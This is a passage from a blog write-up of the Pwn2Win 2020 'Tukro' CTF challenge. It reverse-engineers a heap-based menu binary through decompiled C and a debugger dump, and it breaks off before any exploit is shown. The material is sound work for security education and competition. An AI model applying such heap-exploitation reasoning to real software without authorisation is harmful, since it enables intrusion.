<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Pwn2Win 2020 Tukro Writeup
        
    </title><meta content="Pwn2Win 2020 Tukro Writeup" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/tukro/&t=Pwn2Win 2020 Tukro Writeup"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>Pwn2Win 2020 Tukro Writeup<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-06-01</time></div></div><section class=body><p>Yet another challenge which I spent my time on in this weekend's Pwn2Win CTF.<h2 id=tl-dr-of-the-challenge-binary>TL;DR of The Challenge Binary</h2><p>We've been given Libc 2.23 along with the <code>x86 64-bit Dynamically Linked</code> executable.<p>Let us start reversing without any further delay.<h2 id=reversing>REVERSING</h2><p>To begin with , we land in a small Menu Driven code which has two options , <em>sign_in</em> and <em>sign_up</em>.<ul><li><em>sign_up</em> <ol><li>We have a user limit of <strong>3</strong>.<li>The function takes 16 bytes of user input for <strong>Username</strong> and <strong>Password</strong> and checks if both username and Password are of length atleast <strong>4 bytes</strong>.<li>Then , it checks whether the <strong>username</strong> already exists and if not , it stores the username and password on bss.</ol></ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ff7733>if </span><span>( dword_20304C </span><span style=color:#f29668>> </span><span style=color:#f29718>3 </span><span>)
</span><span>  {
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"The user list is full!"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  }
</span><span>  </span><span style=color:#ff7733>else
</span><span>  {
</span><span>    </span><span style=color:#f07178>memset</span><span>(</span><span style=color:#f29668>&</span><span>s</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x10</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>memset</span><span>(</span><span style=color:#f29668>&</span><span>buf</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x10</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"-----------------------------------------"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Username: "</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#ff7733>LL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>s</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x10</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Password: "</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>s)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>buf</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x10</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f07178>strlen</span><span>(</span><span style=color:#f29668>&</span><span>s) </span><span style=color:#f29668><= </span><span style=color:#f29718>3 </span><span style=color:#f29668>|| </span><span style=color:#f07178>strlen</span><span>(</span><span style=color:#f29668>&</span><span>buf) </span><span style=color:#f29668><= </span><span style=color:#f29718>3 </span><span>)
</span><span>    {
</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"The username and password"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"must be at least 4 characters!"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    </span><span style=color:#ff7733>else
</span><span>    {
</span><span>      </span><span style=color:#ff7733>for </span><span>( i </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;</span><span> i </span><span style=color:#f29668><</span><span> dword_20304C</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>i )
</span><span>      {
</span><span>        </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f29668>!</span><span style=color:#f07178>strcmp</span><span>(</span><span style=color:#f29668>&</span><span>s</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>unk_203060 </span><span style=color:#f29668>+ </span><span style=color:#f29718>200 </span><span style=color:#f29668>*</span><span> i) )
</span><span>        {
</span><span>          </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"User already registered!"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>          </span><span style=color:#ff7733>return </span><span style=color:#f29718>0xFFFFFFFF</span><span style=color:#ff7733>LL</span><span style=color:#bfbab0cc>;
</span><span>        }
</span><span>      }
</span><span>      v1 </span><span style=color:#f29668>= </span><span>(</span><span style=color:#f29668>&</span><span>unk_203060 </span><span style=color:#f29668>+ </span><span style=color:#f29718>200 </span><span style=color:#f29668>*</span><span> dword_20304C)</span><span style=color:#bfbab0cc>;
</span><span>      v2 </span><span style=color:#f29668>=</span><span> v8</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#f29668>*</span><span>v1 </span><span style=color:#f29668>=</span><span> s</span><span style=color:#bfbab0cc>;
</span><span>      v1[</span><span style=color:#f29718>1</span><span>] </span><span style=color:#f29668>=</span><span> v2</span><span style=color:#bfbab0cc>;
</span><span>      v3 </span><span style=color:#f29668>= </span><span>(</span><span style=color:#f29668>&</span><span>unk_203060 </span><span style=color:#f29668>+ </span><span style=color:#f29718>200 </span><span style=color:#f29668>*</span><span> dword_20304C </span><span style=color:#f29668>+ </span><span style=color:#f29718>16</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>      v4 </span><span style=color:#f29668>=</span><span> v10</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#f29668>*</span><span>v3 </span><span style=color:#f29668>=</span><span> buf</span><span style=color:#bfbab0cc>;
</span><span>      v3[</span><span style=color:#f29718>1</span><span>] </span><span style=color:#f29668>=</span><span> v4</span><span style=color:#bfbab0cc>;
</span><span>      v5 </span><span style=color:#f29668>=</span><span> dword_20304C</span><span style=color:#f29668>++</span><span style=color:#bfbab0cc>;
</span><span>      dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> v5] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>  }
</span><span>  </span><span style=color:#ff7733>return </span><span style=color:#f29718>0</span><span style=color:#ff7733>LL</span><span style=color:#bfbab0cc>;
</span><span>
</span></code></pre><ul><li><em>sign_in</em> <ol><li>Asks for username and password , checks if the username already exists on the bss table or not.<li>If yes , then it takes us to another <em>Testimonial_Menu</em>.</ol></ul><p>Let us explore and see what the <em>testimonial_menu</em> has in store for us.<ul><li><em>Write_Testimonial</em> <ol><li>Takes in <em>user_name</em> , checks if it exists and then sets <em>user_idx</em> to the index of the user requested.<li>Checks if the number of testimonials present exceed <strong>9</strong>.<li>Else , It mallocs a chunk of size <strong>0x500</strong> , reads in 0x500 bytes.<li>Stores the malloc pointer onto the corresponding user_name section of bss.<li>It also increments the next 8 bytes of memory after storing the malloc pointer.</ol></ul><p>There's one more thing to this , you can add testimonials only to the users apart from the one you are signed in from. {: .notice}<p>For instance , I have added 8 testimonials and this is how bss section corresponding to the user_name specified looks like.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span>
</span><span style=color:#ffb454>0024</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757128</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa646e6f636573 (</span><span style=color:#c2d94c>'second\n'</span><span>) </span><span style=color:#ffb454>The</span><span> username that I gave to add was second.
</span><span style=color:#ffb454>0032</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757130</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0040</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757138</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa646e6f636573 (</span><span style=color:#c2d94c>'second\n'</span><span>)
</span><span style=color:#ffb454>0048</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757140</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0056</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757148</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x8 
</span><span style=color:#ffb454>0064</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757150</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555758010 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa61616161 (</span><span style=color:#c2d94c>'aaaa\n'</span><span>)
</span><span style=color:#ffb454>0072</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757158</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0080</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757160</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555758520 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa62626262 (</span><span style=color:#c2d94c>'bbbb\n'</span><span>)
</span><span style=color:#ffb454>0088</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757168</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0096</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757170</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555758a30 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa63636363 (</span><span style=color:#c2d94c>'cccc\n'</span><span>)
</span><span style=color:#ffb454>0104</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757178</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0112</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757180</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555758f40 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa64646464 (</span><span style=color:#c2d94c>'dddd\n'</span><span>)
</span><span style=color:#ffb454>0120</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757188</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0128</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757190</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555759450 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa65656565 (</span><span style=color:#c2d94c>'eeee\n'</span><span>)
</span><span style=color:#ffb454>0136</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757198</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0144</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571a0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555759960 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa66666666 (</span><span style=color:#c2d94c>'ffff\n'</span><span>)
</span><span style=color:#ffb454>0152</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571a8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0160</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571b0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x555555759e70 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa67676767 (</span><span style=color:#c2d94c>'gggg\n'</span><span>)
</span><span style=color:#ffb454>0168</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571b8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0176</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571c0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x55555575a380 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa68686868 (</span><span style=color:#c2d94c>'hhhh\n'</span><span>)
</span><span style=color:#ffb454>0184</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571c8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0192</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571d0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0200</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571d8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0208</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571e0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0216</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571e8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0224</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571f0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa6472696874 (</span><span style=color:#c2d94c>'third\n'</span><span>)
</span><span style=color:#ffb454>0232</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x5555557571f8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0 
</span><span style=color:#ffb454>0240</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x555555757200</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa6472696874 (</span><span style=color:#c2d94c>'third\n'</span><span>)
</span><span>
</span></code></pre><p>Here goes the decompilation.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span> user_idx </span><span style=color:#f29668>= -</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>printf</span><span>(</span><span style=color:#c2d94c>"Recipient Username: "</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  v1 </span><span style=color:#f29668>= &</span><span>buf</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>buf</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x10</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f07178>strlen</span><span>(</span><span style=color:#f29668>&</span><span>buf) </span><span style=color:#f29668>> </span><span style=color:#f29718>3 </span><span>)
</span><span>  {
</span><span>    v1 </span><span style=color:#f29668>= &</span><span>unk_203060 </span><span style=color:#f29668>+ </span><span style=color:#f29718>200 </span><span style=color:#f29668>*</span><span> a1</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f07178>strcmp</span><span>(</span><span style=color:#f29668>&</span><span>buf</span><span style=color:#bfbab0cc>,</span><span> v1) )
</span><span>    {
</span><span>      </span><span style=color:#ff7733>for </span><span>( i </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;</span><span> i </span><span style=color:#f29668><</span><span> dword_20304C</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>i )
</span><span>      {
</span><span>        v1 </span><span style=color:#f29668>= &</span><span>unk_203060 </span><span style=color:#f29668>+ </span><span style=color:#f29718>200 </span><span style=color:#f29668>*</span><span> i</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f29668>!</span><span style=color:#f07178>strcmp</span><span>(</span><span style=color:#f29668>&</span><span>buf</span><span style=color:#bfbab0cc>,</span><span> v1) )
</span><span>        {
</span><span>          user_idx </span><span style=color:#f29668>=</span><span> i</span><span style=color:#bfbab0cc>;
</span><span>          </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
</span><span>        }
</span><span>      }
</span><span>    }
</span><span>  }
</span><span>  </span><span style=color:#ff7733>if </span><span>( user_idx </span><span style=color:#f29668>< </span><span style=color:#f29718>0 </span><span>)
</span><span>  {
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"User Not Found!"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    result </span><span style=color:#f29668>= </span><span style=color:#f29718>0xFFFFFFFF</span><span style=color:#ff7733>LL</span><span style=color:#bfbab0cc>;
</span><span>  }
</span><span>  </span><span style=color:#ff7733>else if </span><span>( dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> user_idx] </span><span style=color:#f29668>> </span><span style=color:#f29718>9 </span><span>)
</span><span>  {
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"The user cannot receive new testimonials"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    result </span><span style=color:#f29668>= </span><span style=color:#f29718>0xFFFFFFFF</span><span style=color:#ff7733>LL</span><span style=color:#bfbab0cc>;
</span><span>  }
</span><span>  </span><span style=color:#ff7733>else
</span><span>  {
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Testimonial: "</span><span style=color:#bfbab0cc>,</span><span> v1)</span><span style=color:#bfbab0cc>;
</span><span>    v2 </span><span style=color:#f29668>= </span><span style=color:#f07178>malloc</span><span>(</span><span style=color:#f29718>0x500</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span> v2</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x500</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>&</span><span>unk_203068 </span><span style=color:#f29668>+ </span><span style=color:#f29718>25 </span><span style=color:#f29668>*</span><span> user_idx </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>* </span><span>(dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> user_idx] </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>)) </span><span style=color:#f29668>=</span><span> v2</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>&</span><span>unk_203074 </span><span style=color:#f29668>+ </span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> user_idx </span><span style=color:#f29668>+ </span><span style=color:#f29718>4 </span><span style=color:#f29668>* </span><span>(dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> user_idx] </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>)) </span><span style=color:#f29668>=</span><span> a1</span><span style=color:#bfbab0cc>;
</span><span>    v3 </span><span style=color:#f29668>=</span><span> dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> user_idx]</span><span style=color:#bfbab0cc>;
</span><span>    dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> user_idx] </span><span style=color:#f29668>=</span><span> v3 </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>&</span><span>unk_203070 </span><span style=color:#f29668>+ </span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> user_idx </span><span style=color:#f29668>+ </span><span style=color:#f29718>4 </span><span style=color:#f29668>* </span><span>(v3 </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>)) </span><span style=color:#f29668>=</span><span> user_idx</span><span style=color:#bfbab0cc>;
</span><span>    result </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#ff7733>LL</span><span style=color:#bfbab0cc>;
</span><span>  }
</span><span>  </span><span style=color:#ff7733>return</span><span> result</span><span style=color:#bfbab0cc>;
</span><span>
</span></code></pre><ul><li><p><em>View_All</em> -></p> <ol><li>Views all the data of each chunk.</ol><li><p>Edit -></p> <ol><li>Prints each testimonial<li>Asks for editing a testimonial at a given idx.<li>Then reads in 0x500 bytes of data into the requested testimonial.</ol></ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ff7733>for </span><span>( i </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;</span><span> i </span><span style=color:#f29668><= </span><span style=color:#f29718>3</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>i )
</span><span>  {
</span><span>    </span><span style=color:#ff7733>for </span><span>( j </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;</span><span> j </span><span style=color:#f29668><= </span><span style=color:#f29718>9</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>j )
</span><span>    {
</span><span>      </span><span style=color:#ff7733>if </span><span>( a1 </span><span style=color:#f29668>== *</span><span>(</span><span style=color:#f29668>&</span><span>unk_203074 </span><span style=color:#f29668>+ </span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+ </span><span style=color:#f29718>4 </span><span style=color:#f29668>* </span><span>(j </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>)) </span><span style=color:#f29668>&& *</span><span>(</span><span style=color:#f29668>&</span><span>unk_203068 </span><span style=color:#f29668>+ </span><span style=color:#f29718>25 </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>* </span><span>(j </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>)) )
</span><span>      {
</span><span>        v1 </span><span style=color:#f29668>=</span><span> v8</span><span style=color:#f29668>++</span><span style=color:#bfbab0cc>;
</span><span>        v13[v1] </span><span style=color:#f29668>= &</span><span>unk_203060 </span><span style=color:#f29668>+ </span><span style=color:#f29718>200 </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+ </span><span style=color:#f29718>16 </span><span style=color:#f29668>* </span><span>(j </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#f29718>8</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#f29668>&</span><span>byte_21C9)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Testimonial </span><span style=color:#f29718>%d</span><span style=color:#c2d94c>: "</span><span style=color:#bfbab0cc>,</span><span> v8)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ff7733>for </span><span>( k </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;</span><span> k </span><span style=color:#f29668><= </span><span style=color:#f29718>31</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>k )
</span><span>        {
</span><span>          v2 </span><span style=color:#f29668>= </span><span>(</span><span style=color:#f29718>40 </span><span style=color:#f29668>*</span><span> k </span><span style=color:#f29668>+ *</span><span>v13[v8 </span><span style=color:#f29668>- </span><span style=color:#f29718>1</span><span>])</span><span style=color:#bfbab0cc>;
</span><span>          v3 </span><span style=color:#f29668>=</span><span> v2[</span><span style=color:#f29718>1</span><span>]</span><span style=color:#bfbab0cc>;
</span><span>          </span><span style=color:#f29668>*</span><span>s </span><span style=color:#f29668>= *</span><span>v2</span><span style=color:#bfbab0cc>;
</span><span>          v16 </span><span style=color:#f29668>=</span><span> v3</span><span style=color:#bfbab0cc>;
</span><span>          v4 </span><span style=color:#f29668>=</span><span> v2[</span><span style=color:#f29718>3</span><span>]</span><span style=color:#bfbab0cc>;
</span><span>          v17 </span><span style=color:#f29668>=</span><span> v2[</span><span style=color:#f29718>2</span><span>]</span><span style=color:#bfbab0cc>;
</span><span>          v18 </span><span style=color:#f29668>=</span><span> v4</span><span style=color:#bfbab0cc>;
</span><span>          v19 </span><span style=color:#f29668>=</span><span> v2[</span><span style=color:#f29718>4</span><span>]</span><span style=color:#bfbab0cc>;
</span><span>          </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f29668>!</span><span>s[</span><span style=color:#f29718>0</span><span>] )
</span><span>            </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
</span><span>          </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#f29668>&</span><span>byte_21C9)</span><span style=color:#bfbab0cc>;
</span><span>          v5 </span><span style=color:#f29668>= </span><span style=color:#f07178>strlen</span><span>(s)</span><span style=color:#bfbab0cc>;
</span><span>          </span><span style=color:#ffb454>write</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span> s</span><span style=color:#bfbab0cc>,</span><span> v5)</span><span style=color:#bfbab0cc>;
</span><span>        }
</span><span>      }
</span><span>    }
</span><span>  }
</span><span>  </span><span style=color:#ff7733>if </span><span>( v8 </span><span style=color:#f29668><= </span><span style=color:#f29718>0 </span><span>)
</span><span>  {
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"You haven't written a testimonial yet"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  }
</span><span>  </span><span style=color:#ff7733>else
</span><span>  {
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>Edit Testimonial (y/N): "</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>buf</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>8</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if </span><span>( buf </span><span style=color:#f29668>== </span><span style=color:#f29718>89 </span><span style=color:#f29668>||</span><span> buf </span><span style=color:#f29668>== </span><span style=color:#f29718>121 </span><span>)
</span><span>    {
</span><span>      </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Testimonial Number: "</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>buf)</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>buf</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>8</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
